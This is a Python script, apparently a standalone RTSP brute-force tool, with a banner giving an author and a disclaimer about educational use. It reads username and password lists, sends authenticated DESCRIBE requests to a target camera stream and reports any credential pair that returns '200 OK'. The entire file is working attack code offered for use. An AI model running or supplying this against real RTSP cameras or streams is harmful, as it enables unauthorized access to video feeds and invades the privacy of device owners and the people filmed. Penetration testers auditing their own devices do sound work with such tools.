import socket
import base64
from urllib.parse import urlparse

def explain_rtsp_tool():
    print("""
    ╔═════════════════════════════════════════════════════════════════════════════╗
    ║                              RTSP BRUTE FORCE TOOL                          ║
    ║                             Developed by Andrey Pautov                      ║
    ║                              Email: 1200km@gmail.com                        ║
    ║─────────────────────────────────────────────────────────────────────────────║
    ║   ⚠️  Disclaimer: This tool is designed for educational and ethical         ║
    ║   security testing purposes only. Misuse of this tool can result in         ║
    ║   criminal charges brought against the persons in question. The             ║
    ║   developers assume no liability and are not responsible for any misuse     ║
    ║   or damage caused by this program.                                         ║
    ║─────────────────────────────────────────────────────────────────────────────║
    ║   🔑  Tool Capabilities:                                                    ║
    ║   - This script attempts to brute force RTSP URLs using given credentials.  ║
    ║   - It parses user input for URL, username(s), and password(s), attempting  ║
    ║     to authenticate via the RTSP protocol.                                  ║
    ║─────────────────────────────────────────────────────────────────────────────║
    ║   💡  Usage Instructions:                                                    ║
    ║   - Input the RTSP URL when prompted.                                       ║
    ║   - Specify if you know the username or provide a file with usernames.      ║
    ║   - Provide a file path for a list of passwords to try.                     ║
    ║   - The tool will attempt connections using the provided credentials,       ║
    ║     handling timeouts and retrying as necessary.                            ║
    ╚═════════════════════════════════════════════════════════════════════════════╝
    """)

def parse_rtsp_url(url):
    parsed_url = urlparse(url)
    ip_address = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else 554  # Default RTSP port is 554
    extension = parsed_url.path.lstrip('/') if parsed_url.path else ""
    return ip_address, port, extension

def load_credentials(file_path):
    try:
        # Attempt to open the file with UTF-8 encoding, ignoring errors
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"File not found: {file_path}")
        return []

def try_rtsp_connection(rtsp_url, users, passwords):
    ip_address, port, extension = parse_rtsp_url(rtsp_url)
    initial_timeout = 5
    extended_timeout = 100
    has_timeout_occurred = False

    for username in users:
        for password in passwords:
            while True:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    current_timeout = extended_timeout if has_timeout_occurred else initial_timeout
                    s.settimeout(current_timeout)
                    try:
                        s.connect((ip_address, port))
                        auth_str = f"{username}:{password}"
                        auth_b64 = base64.b64encode(auth_str.encode()).decode()
                        request = f"DESCRIBE rtsp://{username}:{password}@{ip_address}:{port}/{extension} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {auth_b64}\r\nUser-Agent: LibVLC/3.0.0\r\n\r\n"
                        s.send(request.encode('utf-8'))
                        response = s.recv(1024).decode()
                        if "200 OK" in response:
                            print(f"Success: {auth_str}")
                            return True
                        elif "401 Unauthorized" in response:
                            #print(f"Authentication failed with 401 Unauthorized for {auth_str}. Trying next password.")
                            break
                    except socket.timeout:
                        if not has_timeout_occurred:
                            print(f"Connection attempt with next credentials:{username}:{password} timed out. Extending timeout and trying again.")
                            has_timeout_occurred = True
                            continue
                        else:
                            print("Connection attempt timed out again after extending timeout. Moving to next password.")
                            break
                    except socket.error as e:
                        print(f"Connection attempt failed due to a network error: {e}. Moving to next password.")
                        break
                has_timeout_occurred = False
                break

    print("All credentials attempted, no successful connection.")
    return False

if __name__ == "__main__":
    explain_rtsp_tool()
    rtsp_url = input("Enter the RTSP URL (e.g., rtsp://IP_Address:port/extension(not required): ")

    # Input validation for username knowledge
    while True:
        know_username = input("Do you know the username? (yes/no) [y/n]: ").strip().lower()
        if know_username in ('yes', 'y'):
            users = [input("Enter the username: ").strip()]
            break
        elif know_username in ('no', 'n'):
            username_file = input("Enter the path to the username file: ")
            users = load_credentials(username_file)
            break
        else:
            print("Invalid input. Please enter 'yes' or 'no' (y/n).")

    password_file = input("Enter the path to the password list file: ")
    passwords = load_credentials(password_file)
    print("Brute force attack started. This may take some time depending on the number of credentials...")
    try_rtsp_connection(rtsp_url, users, passwords)

